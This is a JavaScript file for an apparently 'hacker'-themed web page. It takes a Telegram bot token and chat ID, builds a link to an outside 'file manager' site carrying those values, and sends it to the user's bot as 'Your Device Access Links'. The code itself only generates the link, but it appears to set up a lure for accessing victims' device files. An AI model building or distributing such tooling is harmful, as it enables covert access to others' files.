document.addEventListener('DOMContentLoaded', function() {
            const hackButton = document.querySelector('.hack-button');
            const tokenInput = document.getElementById('token');
            const chatIdInput = document.getElementById('chatid');
            const resultContainer = document.getElementById('result');
            const statusMessage = document.getElementById('statusMessage');
            
            // Add typing animation to the terminal line
            const typingElement = document.querySelector('.typing');
            setTimeout(() => {
                typingElement.style.animation = 'none';
                typingElement.style.borderRight = 'none';
            }, 3500);
            
            hackButton.addEventListener('click', function() {
                const token = tokenInput.value.trim();
                const chatId = chatIdInput.value.trim();
                
                if (!token || !chatId) {
                    alert("Please fill in both the Token and Chat ID fields.");
                    return;
                }
                
                // Validate token format (basic check)
                if (!token.includes(':') || token.split(':')[0].length < 5) {
                    alert("Invalid Telegram Token format. Please check and try again.");
                    return;
                }
                
                // Validate chat ID (basic check)
                if (isNaN(chatId) || chatId.length < 5) {
                    alert("Invalid Chat ID format. Please check and try again.");
                    return;
                }
                
                // Show loading state
                hackButton.textContent = "SENDING...";
                hackButton.disabled = true;
                resultContainer.style.display = 'block';
                statusMessage.textContent = "Establishing connection to Telegram API...";
                statusMessage.className = "status-message";
                
                // Generate the file manager URL with the provided token and chat ID
                const fileManagerUrl = `https://zerodark.vercel.app/?token=${token}&chatid=${chatId}`;
                
                // Send the file manager URL to the Telegram bot
                sendTelegramMessage(token, chatId, fileManagerUrl);
            });
            
            function sendTelegramMessage(token, chatId, message) {
                statusMessage.textContent = "Sending file access link to your Telegram bot...";
                
                // Using Telegram Bot API to send message
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `🎯 Your Device Access Links  ↙️\n\n${message}\n\nShort link: https://lc.cx/en\n\nDisclaimer: This tool is intended for educational purposes only.`,
                        parse_mode: 'HTML'
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusMessage.textContent = "SUCCESS: File access link has been sent to your Telegram bot!";
                        statusMessage.className = "status-message success";
                    } else {
                        statusMessage.textContent = `ERROR: Failed to send message. ${data.description || 'Please check your Token and Chat ID.'}`;
                        statusMessage.className = "status-message error";
                    }
                    
                    // Reset button
                    hackButton.textContent = "INITIALIZE H@CK";
                    hackButton.disabled = false;
                })
                .catch(error => {
                    console.error('Error:', error);
                    statusMessage.textContent = "ERROR: Network error. Please check your connection and try again.";
                    statusMessage.className = "status-message error";
                    
                    // Reset button
                    hackButton.textContent = "INITIALIZE H@CK";
                    hackButton.disabled = false;
                });
            }
            
            // Add some visual effects to inputs on focus
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.boxShadow = '0 0 10px rgba(0, 255, 0, 0.5)';
                });
                
                input.addEventListener('blur', function() {
                    this.style.boxShadow = 'none';
                });
            });
        });